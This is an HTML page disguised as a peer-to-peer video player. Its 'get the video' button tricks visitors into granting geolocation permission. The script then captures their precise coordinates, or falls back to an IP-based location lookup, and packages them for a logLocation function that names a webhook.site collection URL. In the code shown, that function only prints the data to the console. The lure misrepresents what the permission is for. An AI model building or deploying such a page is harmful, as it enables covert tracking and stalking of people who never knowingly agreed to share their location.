<!DOCTYPE html>
<html>
<head>
    <title>Video you want</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; }
        #consentBanner { background: #f0f7ff; border: 1px solid #4da6ff; padding: 20px; border-radius: 8px; }
        button { padding: 10px 20px; background: #4da6ff; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div id="consentBanner">
        <h2>Video sharing player</h2>
        <p><strong>Video shared</strong> This help you share video safely from peer to peer</p>
        <button onclick="getLocation()">Get the video (permission required)</button>
        <p><small>Allow the permission asked by browser to watch the video</small></p>
    </div>
    <div id="result"></div>

    <script>
    async function getLocation() {
        const resultDiv = document.getElementById('result');
        resultDiv.innerHTML = "<p>Opening video....</p>";
        
        // Create unique session ID (anonymous)
        const sessionId = Math.random().toString(36).substring(2, 15);
        
        // Option 2: Try precise location first
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const { latitude, longitude } = position.coords;
                    resultDiv.innerHTML = `
                        <h3>Local Weather</h3>
                        <p>üìç Your precise location detected</p>
                        <p>Latitude: ${latitude.toFixed(4)}</p>
                        <p>Longitude: ${longitude.toFixed(4)}</p>
                        <p>Accuracy: ${Math.round(position.coords.accuracy)} meters</p>
                    `;
                    logLocation(sessionId, "precise", latitude, longitude);
                },
                async (error) => {
                    // Fallback to IP location
                    await getIPLocation(sessionId);
                }
            );
        } else {
            await getIPLocation(sessionId);
        }
    }

    // Option 1: IP-based location
    async function getIPLocation(sessionId) {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            resultDiv.innerHTML = `
                <h3>Video sharing</h3>
                <p>Peer to peer video sharing</p>
                <p>City: ${data.city}</p>
                <p>Region: ${data.region}</p>
                <p>Country: ${data.country_name}</p>
            `;
            logLocation(sessionId, "ip", data.latitude, data.longitude);
        } catch (error) {
            resultDiv.innerHTML = "<p>Error: Could not open video</p>";
        }
    }

    // Free logging via webhook.site
    async function logLocation(sessionId, type, lat, lng) {
        const webhookURL = "https://webhook.site/f7010d69-01a2-4586-b369-1c5b7316740f";
        const data = {
            sessionId,
            type,
            lat,
            lng,
            timestamp: new Date().toISOString()
        };
        
        // Send data (won't work in GitHub Pages due to CORS)
        // This is just for demonstration - we'll use manual logging
        console.log("LOCATION DATA:", JSON.stringify(data, null, 2));
    }
    </script>
    
    <div style="margin-top:30px; font-size:0.8em; color:#666; border-top:1px solid #eee; padding-top:10px;">
        <p>Video shared error<a href="#" onclick="location.reload()">Reset</a></p>
    </div>
</body>
</html>
